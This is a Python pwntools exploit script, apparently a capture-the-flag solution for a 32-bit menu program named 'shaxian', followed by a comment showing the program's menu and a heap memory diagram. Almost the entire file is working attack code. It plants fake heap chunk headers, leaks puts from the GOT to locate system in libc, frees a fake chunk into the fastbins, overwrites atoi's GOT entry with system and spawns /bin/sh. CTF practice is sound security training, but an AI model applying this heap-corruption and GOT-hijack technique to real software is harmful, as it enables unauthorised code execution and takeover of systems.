from pwn import *
context.log_level = 'debug'

bin = ELF('shaxian')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
cn = process('./shaxian')

def diancai(index,number = '0'):
	cn.sendline('1')
	cn.recv()
	cn.sendline(index)
	cn.recv()
	cn.sendline(number)

cn.recv()#address
cn.sendline(p32(0)+p32(0x31))#fake next_chunk_header
cn.recv()#phone 0x0804B0C0
cn.sendline('aaaa'*60+p32(0)+p32(0x31))#fake chunk_header

cn.recv()#menu
pay = 'a'*32+p32(bin.got['puts'])#to leak got.puts
print hex(bin.got['puts'])
diancai(pay)#send payload


cn.recv()
cn.sendline('4')
cn.recvuntil('* ')
cn.recvuntil('* ')
p_puts = int(cn.recvline())+0x100000000#get got.puts

p_system = p_puts - libc.symbols['puts'] + libc.symbols['system']#get p_system

pt_link = 0x0804B1C0

pay = 'a'*32 + p32(pt_link-8)#fake chunk
diancai(pay)#send payload

cn.recv()
cn.sendline('2')#free ,let fake chunk into fastbins

cn.recv()
pay = 'aaaa' + p32(bin.got['atoi'])#got hijack atoi to system
diancai(pay,str(p_system-0x100000000))#use fake chunk in fastbins

cn.sendline('/bin/sh')#call atoi to get shell
cn.interactive()
'''
1.WO YAO DIAN CAI
2.Submit
3.I want Receipt
4.Review
5.Exit
                             +=========================+=========================+
b0   head(phone)       ->    |     prev_size = 0       |        size = 0x31      |
                             +-------------------------+-------------------------+
b8   malloc_ret_addr   ->    |         count           |        word_start       |
                             +-------------------------+-------------------------+
c0   pt_link           ->    |  pt_link (mod to atoi)  |       ////////////      |
                             +-------------------------+-------------------------+
c8                     ->    |       ////////////      |       ////////////      |
                             +-------------------------+-------------------------+
d0                     ->    |       ////////////      |       ////////////      |
                             +-------------------------+-------------------------+
d8                     ->    |       ////////////      |       chunk_end         |
                             +=========================+=========================+
e0   next_head(addr)   ->    |     prev_size = 0       |        size = 0x31      |
                             +-------------------------+-------------------------+
'''

